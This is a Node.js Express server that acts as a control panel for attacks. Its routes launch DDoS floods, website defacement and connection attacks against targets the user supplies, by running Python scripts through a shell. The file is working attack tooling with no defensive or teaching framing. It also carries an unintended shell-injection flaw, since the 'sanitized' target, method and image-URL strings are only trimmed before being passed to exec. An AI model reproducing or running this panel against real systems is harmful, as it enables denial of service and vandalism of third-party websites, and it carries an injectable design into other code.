const express = require('express');
const { exec } = require('child_process');
const app = express();
const port = 3000;
const path = require('path');
const fs = require('fs');

app.use(express.static(path.join(__dirname, '../')));
app.use(express.json());

function handleCommandExecution(command, res, operation) {
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return res.status(500).send(`Error executing ${operation}: ${stderr}`);
        }
        console.log(`stdout: ${stdout}`);
        res.send(`${operation} initiated`);
    });
}

const ddosScriptPath = path.join(__dirname, 'ddos.py');
const defacementScriptPath = path.join(__dirname, 'defacement.py');
const connectionScriptPath = path.join(__dirname, 'connection.py');

// Ensure scripts exist before defining routes
fs.access(ddosScriptPath, fs.constants.F_OK, (err) => {
    if (!err) {
        app.post('/main/ddos', (req, res) => {
            const target = req.body.target;
            const time = req.body.time;
            const method = req.body.method;

            if (!target || !time || !method) {
                return res.status(400).send('Target, time, and method are required');
            }

            const sanitizedTarget = String(target).trim();
            const sanitizedTime = parseInt(time, 10);
            const sanitizedMethod = String(method).trim();

            if (isNaN(sanitizedTime) || sanitizedTime <= 0) {
                return res.status(400).send('Invalid time value.');
            }

            const command = `python3 ${ddosScriptPath} --target ${sanitizedTarget} --time ${sanitizedTime} --method ${sanitizedMethod}`;
            handleCommandExecution(command, res, 'DDoS attack');
        });
    } else {
        console.warn("ddos.py not found. DDoS route disabled.");
    }
});

fs.access(defacementScriptPath, fs.constants.F_OK, (err) => {
    if (!err) {
        app.post('/main/defacement', (req, res) => {
            const target = req.body.target;
            const imageUrl = req.body.imageUrl;

            if (!target || !imageUrl) {
                return res.status(400).send('Target and image URL are required');
            }

            const sanitizedTarget = String(target).trim();
            const sanitizedImageUrl = String(imageUrl).trim();

            const command = `python3 ${defacementScriptPath} --target ${sanitizedTarget} --image_url ${sanitizedImageUrl}`;
            handleCommandExecution(command, res, 'Defacement');
        });
    } else {
        console.warn("defacement.py not found. Defacement route disabled.");
    }
});

fs.access(connectionScriptPath, fs.constants.F_OK, (err) => {
    if (!err) {
        app.post('/main/connection', (req, res) => {
            const target = req.body.target;
            const port = req.body.port;

            if (!target || !port) {
                return res.status(400).send('Target and port are required');
            }

            const sanitizedTarget = String(target).trim();
            const sanitizedPort = parseInt(port, 10);

            if (isNaN(sanitizedPort)) {
                return res.status(400).send('Invalid port value.');
            }

            const command = `python3 ${connectionScriptPath} --target ${sanitizedTarget} --port ${sanitizedPort}`;
            handleCommandExecution(command, res, 'Connection');
        });
    } else {
        console.warn("connection.py not found. Connection route disabled.");
    }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});